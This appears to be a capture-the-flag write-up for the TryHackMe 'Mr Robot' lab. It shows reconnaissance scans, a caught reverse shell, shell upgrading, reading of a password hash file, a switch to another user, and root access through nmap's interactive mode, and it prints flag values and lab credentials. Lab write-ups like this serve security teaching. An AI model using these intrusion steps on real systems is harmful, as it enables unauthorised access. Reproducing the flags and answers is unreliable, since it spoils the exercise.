# Mr Robot CTF

## Nmap

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mrrobot-ctf]
└─$ nmap -v -Pn -p 22,80,443 -A -sC -sV 10.201.118.69
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 14:06 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:06
Completed Parallel DNS resolution of 1 host. at 14:06, 0.07s elapsed
Initiating SYN Stealth Scan at 14:06
Scanning 10.201.118.69 [3 ports]
Discovered open port 443/tcp on 10.201.118.69
Discovered open port 22/tcp on 10.201.118.69
Discovered open port 80/tcp on 10.201.118.69
Completed SYN Stealth Scan at 14:06, 0.34s elapsed (3 total ports)
Initiating Service scan at 14:06
Scanning 3 services on 10.201.118.69
Completed Service scan at 14:06, 14.11s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.201.118.69
Retrying OS detection (try #2) against 10.201.118.69
adjust_timeouts2: packet supposedly had rtt of -472478 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -472478 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -427062 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -427062 microseconds.  Ignoring time.
Initiating Traceroute at 14:07
Completed Traceroute at 14:07, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:07
Completed Parallel DNS resolution of 2 hosts. at 14:07, 0.02s elapsed
NSE: Script scanning 10.201.118.69.
Initiating NSE at 14:07
Completed NSE at 14:07, 12.84s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 2.57s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Nmap scan report for 10.201.118.69
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ec:5d:99:b9:83:dd:92:94:de:ef:de:c8:19:bc:5a:19 (RSA)
|   256 a5:a7:47:05:49:3b:c5:5e:06:68:87:31:a7:9d:5a:55 (ECDSA)
|_  256 33:40:7a:5c:5d:63:e8:c9:43:90:c3:be:41:2e:8c:e6 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
|_SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (90%), Linux 5.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 7.813 days (since Tue Sep 16 18:36:44 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   37.64 ms  10.17.0.1
2   ... 4
5   266.99 ms 10.201.118.69

NSE: Script Post-scanning.
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.07 seconds
           Raw packets sent: 101 (8.628KB) | Rcvd: 557 (646.419KB)

```

## Gobuster

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mrrobot-ctf]
└─$ gobuster dir -u http://10.201.118.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 16
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.118.69
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.201.118.69/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.201.118.69/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.201.118.69/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.201.118.69/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.201.118.69/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.201.118.69/feed/]
/video                (Status: 301) [Size: 235] [--> http://10.201.118.69/video/]
/image                (Status: 301) [Size: 0] [--> http://10.201.118.69/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.201.118.69/feed/atom/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.201.118.69/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.201.118.69/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.201.118.69/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2671]
/css                  (Status: 301) [Size: 233] [--> http://10.201.118.69/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.201.118.69/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.201.118.69/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.201.118.69/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.201.118.69/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.201.118.69/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.201.118.69/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.201.118.69/wp-admin/]
/                 (Status: 301) [Size: 0] [--> http://10.201.118.69/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.201.118.69/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 301) [Size: 0] [--> http://10.201.118.69/0000/]

```

![image.png](/images/mr-robot/image.png)
&nbsp;
![image.png](/images/mr-robot/image1.png)
&nbsp;
![image.png](/images/mr-robot/image2.png)
&nbsp;
![image.png](/images/mr-robot/image3.png)
&nbsp;
![image.png](/images/mr-robot/image4.png)

![image.png](/images/mr-robot/image5.png)
&nbsp;
![image.png](/images/mr-robot/image6.png)
&nbsp;
```bash
elliot:ER28-0652
```
&nbsp;
![image.png](/images/mr-robot/image7.png)
&nbsp;
![image.png](/images/mr-robot/image8.png)
&nbsp;
![image.png](/images/mr-robot/image9.png)
&nbsp;
![image.png](/images/mr-robot/image10.png)
&nbsp;
```bash
┌──(ajay㉿ajay)-[~/tryhackme/mrrobot-ctf]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.28.158] from (UNKNOWN) [10.201.125.245] 40178
Linux ip-10-201-125-245 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 12:09:19 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

```

```bash
daemon@ip-10-201-125-245:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@ip-10-201-125-245:/$ clear
clear
TERM environment variable not set.
daemon@ip-10-201-125-245:/$ ls home
ls home
robot  ubuntu
daemon@ip-10-201-125-245:/$ ls home/robot
ls home/robot
key-2-of-3.txt  password.raw-md5
daemon@ip-10-201-125-245:/$ cat home/robot/key-2-of-3.txt
cat home/robot/key-2-of-3.txt
cat: home/robot/key-2-of-3.txt: Permission denied
daemon@ip-10-201-125-245:/$ cat home/robot/password.raw-md5
cat home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

```bash
robot:abcdefghijklmnopqrstuvwxyz
```

```bash
daemon@ip-10-201-125-245:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
robot@ip-10-201-125-245:/$
robot@ip-10-201-125-245:/$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@ip-10-201-125-245:/$ ls
ls
bin   home            lib32       mnt   run   tmp      vmlinuz.old
boot  initrd.img      lib64       opt   sbin  usr
dev   initrd.img.old  lost+found  proc  srv   var
etc   lib             media       root  sys   vmlinuz
robot@ip-10-201-125-245:/$ cd ~
cd ~
robot@ip-10-201-125-245:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@ip-10-201-125-245:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

```bash
robot@ip-10-201-125-245:~$ nmap
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
nmap> whoami
root
nmap> ls /root
firstboot_done  key-3-of-3.txt
nmap> cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
